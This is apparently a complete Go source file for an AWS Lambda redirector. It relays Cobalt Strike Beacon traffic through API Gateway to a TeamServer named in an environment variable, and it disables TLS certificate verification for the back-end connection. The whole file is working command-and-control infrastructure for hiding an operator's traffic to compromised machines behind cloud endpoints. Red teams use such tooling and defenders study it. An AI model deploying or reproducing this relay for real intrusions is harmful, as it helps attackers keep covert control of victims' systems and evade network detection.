package main

import (
	"crypto/tls"
	"encoding/base64"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
)

type Response events.APIGatewayProxyResponse

func Handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyResponse, error) {

	log.Printf("Request recieved ...")
	
	var bodyDecoded []byte
	var body []byte
	var err error
	var outboundHeaders map[string]string

	teamserver := os.Getenv("TEAMSERVER")

	// Build our request URL as received to pass onto CS
	url, err := url.Parse(teamserver + "/" + request.RequestContext.Stage + request.Path)
	if err != nil {
        log.Printf("Error building request to TeamServer: %v", err)
    }

    log.Printf("URL to be forwarded: %v", url)

	client := http.Client{}

	// Set to allow invalid HTTPS certs on the back-end server
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Extract any provided query parameters
	if request.QueryStringParameters != nil {
		q := url.Query()
		for key, value := range request.QueryStringParameters {
			q.Set(key, value)
		}
		url.RawQuery = q.Encode()
	}

	// Handle potential base64 encoding of body
	if request.IsBase64Encoded {
		bodyDecoded, err = base64.StdEncoding.DecodeString(request.Body)
		if err != nil {
			log.Printf("Error base64 decoding AWS request body: %v", err)
		}
	} else {
		bodyDecoded = []byte(request.Body)
	}

	// Send the request to our Team Server
	req, err := http.NewRequest(request.HTTPMethod, url.String(), strings.NewReader(string(bodyDecoded)))
	if err != nil {
		log.Printf("Error forwarding request to TeamServer: %v", err)
	}

	// Add our inbound headers to the request
	for key, value := range request.Headers {
		req.Header.Set(key, value)
	}

	// Forward the request to our TeamServer
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error forwarding request to TeamServer: %v", err)
	}
	log.Printf("Request forwarded to TeamServer :D ")

	// Parse the TS response headers
	outboundHeaders = map[string]string{}

	for key, value := range resp.Header {
		outboundHeaders[key] = value[0]
	}

	// Store the TS response body
	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error recieving response from TeamServer: %v", err)
	}
	
	log.Printf("Response forwarded to Beacon :D ")
	// Forward the response onto beacon
	return events.APIGatewayProxyResponse{StatusCode: resp.StatusCode, Body: string(body), Headers: outboundHeaders}, nil
	
}

func main() {
	lambda.Start(Handler)
}